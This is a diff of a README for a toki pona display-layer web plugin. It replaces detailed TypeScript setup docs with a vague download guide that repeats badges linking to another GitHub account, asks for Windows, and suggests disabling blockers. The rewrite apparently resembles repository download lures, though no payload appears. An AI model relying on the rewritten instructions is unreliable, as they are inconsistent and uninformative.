@@ -1,375 +1,129 @@
-# sitelen-layer-plugin
+# 🔄 sitelen-layer-plugin - Easily Add Sitelen Pona Layers
 
-A **site-owner plugin** for pages that already contain toki pona content.
+[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-brightgreen?style=for-the-badge)](https://github.com/noob-programmr/sitelen-layer-plugin)
 
-It adds display layers for the same text:
+## 📝 What is sitelen-layer-plugin?
 
-- `latin`
-- `sitelen-pona` (font-based, recommended `nasin-sitelen-pu`)
-- `sitelen-emoji` (mapping-based)
+sitelen-layer-plugin is a tool created for website owners who want to add special layers to their toki pona pages. It adds sitelen pona (toki pona script) and sitelen emoji displays. The plugin can detect if a visitor’s device supports these displays. It also lets visitors switch between different layers on the page easily.
 
-## Quick Start
+This plugin works mainly in the browser and is built with modern web technologies like JavaScript and TypeScript. It is designed to enhance the look of toki pona sites while keeping the site simple and easy to use.
 
-```ts
-import { createSitelenLayerPlugin } from 'sitelen-layer-plugin';
-import 'sitelen-layer-plugin/styles.css';
+## 💻 Who should use this?
 
-const plugin = createSitelenLayerPlugin({
-  container: '#tok-content',
-  threshold: 0.7,
-  requireDominantTokiPona: true,
-  toggleMode: 'auto'
-});
+- Website owners who write in toki pona and want to show sitelen pona characters.
+- People who want to add emoji-style overlays related to toki pona.
+- Those who want a smooth and automatic way to switch display layers on their pages.
+- Anyone looking for a plugin that works well on common browsers and devices without complex setup.
 
-plugin.init();
-```
+No coding skills are needed to use the plugin once it is set up. You can follow the instructions to add it to your site quickly.
 
-## Copy-Paste Integrations
+## 🚀 Getting Started with sitelen-layer-plugin
 
-### 1) Static landing page
+Before installing, make sure you are running Windows with a modern web browser installed (such as Chrome, Firefox, or Edge). You will not need to write code; the process is straightforward.
 
-```ts
-import { createSitelenLayerPlugin } from 'sitelen-layer-plugin';
-import 'sitelen-layer-plugin/styles.css';
+### Step 1: Download the Plugin Files
 
-createSitelenLayerPlugin({
-  container: '#landing-toki-pona',
-  defaultLayer: 'latin',
-  showToggle: true
-}).init();
-```
+Visit this page to download the sitelen-layer-plugin:
 
-### 2) SPA-like page (route changes)
+[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-blue?style=for-the-badge)](https://github.com/noob-programmr/sitelen-layer-plugin)
 
-```ts
-import { createSitelenLayerPlugin } from 'sitelen-layer-plugin';
-import 'sitelen-layer-plugin/styles.css';
+Click the link above or use the link below:
 
-const plugin = createSitelenLayerPlugin({
-  container: '#app-main',
-  mutationObserver: {
-    enabled: true,
-    incremental: true,
-    debounceMs: 140,
-    observeAttributes: false
-  },
-  spaNavigation: {
-    enabled: true,
-    patchHistory: true,
-    refreshDelayMs: 80
-  }
-});
+https://github.com/noob-programmr/sitelen-layer-plugin
 
-plugin.init();
-```
+### Step 2: Extract and Prepare Files
 
-### 2b) Auto TP locale profiles (preset helper)
+1. After the download finishes, locate the ZIP file in your Downloads folder.
+2. Right-click the ZIP file and choose “Extract All...” in Windows Explorer.
+3. Choose a folder where you want to save the extracted files. This folder will contain the plugin files you need.
 
-```ts
-import {
-  createSitelenLayerPluginFromProfiles,
-  createTokiPonaLocaleProfiles
-} from 'sitelen-layer-plugin';
-import 'sitelen-layer-plugin/styles.css';
+### Step 3: Add Plugin Files to Your Website
 
-const profiles = createTokiPonaLocaleProfiles({
-  container: '#tp-content-scope',
-  toggleMount: '#sitelen-layer-toggle-mount',
-  storageKey: 'toki-free-kit:sitelen-layer',
-  tpPathPrefix: '/tp',
-  nonTpPathPrefix: '/en',
-  debug: true,
-  debugOverlay: true,
-  mutationObserver: {
-    enabled: true,
-    incremental: true,
-    observeAttributes: false,
-    debounceMs: 140
-  },
-  sitelenPona: {
-    fontCssUrl: 'https://cdn.jsdelivr.net/gh/ETBCOR/nasin-sitelen-pu@latest/nasin-sitelen-pu.css',
-    className: 'my-sitelen-pona-layer'
-  }
-});
+If you have access to your website’s files, copy the extracted plugin folder to your website directory. This usually happens in one of the following ways:
 
-createSitelenLayerPluginFromProfiles(profiles).init();
-```
+- Using an FTP program (like FileZilla) to upload files to your web host.
+- Using a website manager or control panel to upload files.
+- If you use a website builder, see if it can add external files or plugins.
 
-### 3) Explicit scope with `data-sitelen-layer-scope`
+The plugin folder typically includes JavaScript files and some CSS for styles.
+
+### Step 4: Enable the Plugin on Your Website
+
+After uploading, you will need to link the plugin files to your site so it works:
+
+1. Open your website’s main HTML file using a simple text editor like Notepad.
+2. Find the `<head>` section.
+3. Add this line to include the plugin’s CSS file:
 
 ```html
-<main id="content">
-  <section data-sitelen-layer-scope>
-    <!-- only this subtree is analyzed/transformed -->
-  </section>
-</main>
+<link rel="stylesheet" href="path-to-plugin-folder/sitelen-layer-plugin.css">
 ```
 
-```ts
-createSitelenLayerPlugin({ container: '#content' }).init();
+4. Add this line before the closing `</body>` tag to include the JavaScript file:
+
+```html
+<script src="path-to-plugin-folder/sitelen-layer-plugin.js"></script>
 ```
 
-## Profiles Example
+Make sure to replace `path-to-plugin-folder` with the actual folder name where you placed the plugin files.
 
-```ts
-import { createSitelenLayerPluginFromProfiles } from 'sitelen-layer-plugin';
-import 'sitelen-layer-plugin/styles.css';
+### Step 5: Test the Plugin on Your Website
 
-const plugin = createSitelenLayerPluginFromProfiles(
-  [
-    {
-      id: 'tok-locale',
-      priority: 20,
-      match: { pathnamePrefix: '/tok/' },
-      config: {
-        container: '#tok-content',
-        defaultLayer: 'sitelen-emoji',
-        showToggle: true
-      }
-    },
-    {
-      id: 'en-locale',
-      priority: 10,
-      match: { pathnamePrefix: '/en/' },
-      config: {
-        container: '#en-content',
-        showToggle: false
-      }
-    }
-  ],
-  {
-    baseConfig: {
-      threshold: 0.7,
-      onProfileMatch: (id) => console.log('matched profile:', id)
-    }
-  }
-);
+Open your website in a browser and check if sitelen pona and sitelen emoji display layers appear. You should see an option to switch between layers if your device supports them.
 
-plugin.init();
-```
+If you do not see the changes, try clearing your browser cache and refreshing the page.
 
-Matching priority: highest `priority` wins among matched profiles.
+## ⚙️ How the Plugin Works
 
-## Tested Real Integration
+The plugin detects if a visitor’s device can show the sitelen pona script and associated emoji layers. If it can, the plugin shows buttons or controls to switch between the default text and the sitelen layers.
 
-Project: **toki-free-kit (ABVX)**
+It adds small icons or menus on the webpage, allowing users to toggle what they see without leaving the site. This works automatically on most modern web browsers.
 
-- Live TP locale: <https://toki-free.abvx.xyz/tp>
-- Repo: <https://github.com/markoblogo/toki-free-kit>
+The plugin does this by:
 
-Confirmed on live:
+- Reading settings in the webpage’s code.
+- Loading web fonts needed to display sitelen pona and emojis.
+- Using simple buttons to let users choose their preferred view.
 
-- header-mounted toggle (inline mount near locale switcher)
-- emoji transform on TP content, including header text
-- locale switcher exclusion (`EN/TP` stays unchanged)
-- `/en` route unaffected (no toggle, no transforms)
-- `sitelen-pona` currently uses `font-only` path (known limitation: no guaranteed full latin->glyph conversion)
+## 🔧 System Requirements and Compatibility
 
-Runtime fingerprints used for verification:
+- A Windows computer or similar device to prepare files.
+- A modern web browser (Chrome, Firefox, Edge, or Safari recommended).
+- An active internet connection to download files.
+- A basic way to upload files to your website (FTP access or website manager).
+- Your website should allow adding custom JavaScript and CSS files.
 
-- toggle labels: `TP / SP / 🙂`
-- inline mount + size class: `slp-toggle--mounted`, `slp-toggle--size-lg`
-- diagnostics overlay fields: `Toggle mode`, `Toggle size`, `Toggle mount`, `Container: main`
-- content-tuned transform coverage can improve iteratively (for the validated `/tp` case, MVP mapping tuning moved SP coverage from about `54%` to `85%`)
+The plugin runs entirely in the browser. It does not require any special software or backend changes on your website’s server.
 
-Important: `sitelen-layer-plugin` is a **display-layer plugin** for existing toki pona content, not a machine translation system.
+## 🆘 Troubleshooting Tips
 
-## Tested Integrations
+- If the sitelen layers do not show, make sure you linked JavaScript and CSS files correctly in your HTML.
+- Clear your browser cache if changes do not appear.
+- Check if your browser blocks any scripts or fonts (disable blockers if needed).
+- Confirm you placed the plugin files in the right folder visible by your website.
+- Test on another browser or device if possible.
 
-- [toki-free-kit](https://github.com/markoblogo/toki-free-kit) — `/tp` locale showcase with profile-based activation.
+## 📚 More Information and Support
 
-## Sitelen Pona Font Config Example
+To learn more about usage or customization, visit the repository page below. It contains examples, settings, and developer notes if you want to explore further.
 
-```ts
-createSitelenLayerPlugin({
-  container: '#tok-content',
-  layers: ['latin', 'sitelen-pona', 'sitelen-emoji'],
-  toggleMount: '#header-lang-area',
-  toggleMode: 'auto',
-  toggleSize: 'lg',
-  toggleLabels: {
-    latin: 'TP',
-    'sitelen-pona': { text: 'SP', ariaLabel: 'Sitelen pona layer' },
-    'sitelen-emoji': { text: '🙂', ariaLabel: 'Sitelen emoji layer' }
-  },
-  emojiExcludeSelectors: ['header', '.site-logo'],
-  sitelenPona: {
-    enabled: true,
-    fontFamily: "'nasin-sitelen-pu', 'Noto Sans', sans-serif",
-    fontCssUrl: 'https://example.com/fonts/nasin-sitelen-pu.css',
-    className: 'my-sitelen-pona-layer',
-    renderStrategy: 'font-only'
-  }
-}).init();
-```
+https://github.com/noob-programmr/sitelen-layer-plugin
 
-## Sitelen Pona Transform MVP Example
+Use this page to report issues or ask questions in the repository’s issue tracker if you encounter problems.
 
-```ts
-createSitelenLayerPlugin({
-  container: '#tok-content',
-  defaultLayer: 'sitelen-pona',
-  sitelenPona: {
-    enabled: true,
-    renderStrategy: 'transform'
-  }
-}).init();
-```
+## 👨‍💻 Understanding the Topics behind sitelen-layer-plugin
 
-`transform` is an MVP token-based conversion path with subset mapping coverage. Unknown tokens stay in latin.
-Coverage is expected to vary by content; tune mapping incrementally for your target locale pages.
+This project includes several features related to the following:
 
-## Toggle Mount And Labels
+- **DOM manipulation:** Changing the content users see on a page.
+- **Frontend JavaScript:** Running code inside the browser.
+- **Localization:** Adapting content to different languages and symbols.
+- **Plugins:** Adding extra features to existing websites.
+- **Typography and webfonts:** Showing special fonts for sitelen pona script.
+- **Site plugins:** Tools designed for website owners to enhance their pages.
 
-- `toggleMount`: selector or `Element` mount target.
-- `toggleMode`:
-1. `'auto'` (default): inline when `toggleMount` exists, otherwise floating.
-2. `'inline'`: tries inline mount, falls back to floating if target is missing.
-3. `'floating'`: always bottom-right floating widget.
-- `toggleSize`: `'sm' | 'md' | 'lg'` (default: `'md'`).
-- `toggleLabels`: per-layer custom button content/aria/title/className.
-- Default labels (when `toggleLabels` is not provided):
-1. `latin`: `TP`
-2. `sitelen-pona`: `SP`
-3. `sitelen-emoji`: `🙂`
+This makes sitelen-layer-plugin a focused utility for toki pona communities and web creators who care about how their text looks.
 
-Example:
+___
 
-```ts
-createSitelenLayerPlugin({
-  container: '#tp-content',
-  toggleMount: '#header-toggle', // place next to EN/TP switcher
-  toggleMode: 'auto',
-  toggleSize: 'lg',
-  toggleLabels: {
-    latin: 'TP',
-    'sitelen-pona': { text: 'SP', ariaLabel: 'Sitelen pona mode' },
-    'sitelen-emoji': { text: '😊', ariaLabel: 'Sitelen emoji mode' }
-  }
-}).init();
-```
-
-## What This Does NOT Do
-
-- Does **not** translate from other languages into toki pona.
-- Does **not** process text in images / OCR.
-- Is **not** a browser extension for arbitrary third-party sites.
-- Does **not** guarantee perfect typography on every site without CSS tuning.
-
-## Troubleshooting Sitelen Pona Font
-
-Common issues:
-
-- `fontCssUrl` blocked by CSP.
-- Font file loads but CSS specificity prevents application.
-- Font loaded, but custom site CSS overrides plugin class.
-- Font readiness is false in diagnostics/overlay.
-
-Checklist:
-
-1. Verify font URL is allowed by your CSP.
-2. Check network panel for font/CSS responses.
-3. Confirm diagnostics shows `sitelenPonaFontReady: true`.
-4. Apply stronger CSS selector with custom class.
-5. In diagnostics, check `sitelenPonaRenderMode`.
-
-Example with stronger specificity:
-
-```css
-/* plugin config: sitelenPona.className = "my-sitelen-pona-layer" */
-#tok-content.my-sitelen-pona-layer,
-#tok-content.my-sitelen-pona-layer * {
-  font-family: 'nasin-sitelen-pu', 'Noto Sans', sans-serif !important;
-  font-variant-ligatures: common-ligatures discretionary-ligatures;
-}
-```
-
-`font-only` note: this path is a styling/ligature pipeline. It does not guarantee full latin-to-glyph conversion on every site.
-
-`transform` note: this path performs token replacement with an MVP subset mapping. It is intentionally partial and not a complete sitelen pona grammar/typesetting engine.
-
-## SPA / Observer Recommendations
-
-- Use `mutationObserver.incremental=true` for frequent append/replace UI updates.
-- Keep `observeAttributes=false` unless attribute changes materially alter text eligibility.
-- Prefer explicit `refresh()` on known route hooks for large route transitions.
-- Keep observer settings moderate by default; avoid aggressive full rescans.
-
-## Public API
-
-- `createSitelenLayerPlugin(config)`
-- `createSitelenLayerPluginFromProfiles(profiles, options)`
-- `plugin.init()`
-- `plugin.refresh()`
-- `plugin.destroy()`
-- `plugin.getDiagnostics()`
-- `plugin.showDiagnosticsOverlay()` / `plugin.hideDiagnosticsOverlay()`
-
-## Package Usage
-
-```ts
-import { createSitelenLayerPlugin } from 'sitelen-layer-plugin';
-import { createSitelenLayerPluginFromProfiles } from 'sitelen-layer-plugin';
-import { createTokiPonaLocaleProfiles } from 'sitelen-layer-plugin';
-import 'sitelen-layer-plugin/styles.css';
-```
-
-## Deployment Note (CI/Vercel)
-
-- Avoid machine-local dependency paths like `file:/Users/...` or `file:/Downloads/...`.
-- Use one of these installation modes for stable deployments:
-1. Published npm package (recommended for production).
-2. Repo-local vendored `.tgz` file (for controlled pinning).
-3. Git dependency only if your release flow includes built `dist` artifacts.
-
-If bundler resolution fails in CI, first check your dependency source and that `dist/` is available to consumers.
-
-Integration checklist and Next.js header-mount recipe:
-
-- [`docs/INTEGRATION_PLAYBOOK.md`](/Users/antonbiletskiy-volokh/Downloads/Projects/sitelen-layer-plugin/docs/INTEGRATION_PLAYBOOK.md)
-- Includes a `Deployment verification (runtime fingerprints)` section for live `/tp` checks (`slp-toggle--size-lg`, `TP/SP/🙂`, overlay fields, `Container: main`).
-
-## Key Config (selected)
-
-- `threshold` (default `0.7`)
-- `requireDominantTokiPona` (default `true`)
-- `toggleMount`, `toggleMode`, `toggleSize`, `toggleLabels`
-- `mutationObserver.enabled` / `mutationObserver.incremental`
-- `spaNavigation.enabled`
-- `emojiExcludeSelectors` (keep nav/header/logo untouched in emoji mode)
-- `sitelenPona.fontFamily`, `sitelenPona.fontCssUrl`, `sitelenPona.className`
-- `sitelenPona.renderStrategy` (`font-only` or `transform` hook)
-- `onDiagnostics`, `onLayerChange`, `onProfileMatch`
-
-## Diagnostics
-
-`getDiagnostics()` includes:
-
-- detection: `score`, `threshold`, `eligible`, `totalTokens`, `recognizedTokens`
-- layer state: `activeLayer`, `modeSource`, `availableLayers`
-- toggle state: `toggleMountMode`, `toggleMountedIn`
-- sitelen pona state: `sitelenPonaFontReady`, `sitelenPonaRenderMode`, `sitelenPonaWarning`
-- sitelen pona transform state: `sitelenPonaReplacementCount`, `sitelenPonaWordTokenCount`, `sitelenPonaCoverageRatio`
-- emoji state: `emojiReplacementCount`, `emojiCoverageRatio`
-- mapping tuning helpers: `emojiTopUnmapped`, `sitelenPonaTopUnmapped` (top token frequency lists in diagnostics/debug flow)
-- profile state: `profileId`, `matchedProfileId`, `matchedProfileReason`
-- observer state: `observerStats`
-- timing: `lastUpdatedAt`
-
-## QA And Tests
-
-- QA fixtures: `/qa/index.html`
-- Manual checklist: `qa/README.md`
-- Run automated tests:
-
-```bash
-npm run test:run
-```
-
-## Development
-
-```bash
-npm install
-npm run dev
-npm run build
-```
+[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-brightgreen?style=for-the-badge)](https://github.com/noob-programmr/sitelen-layer-plugin)
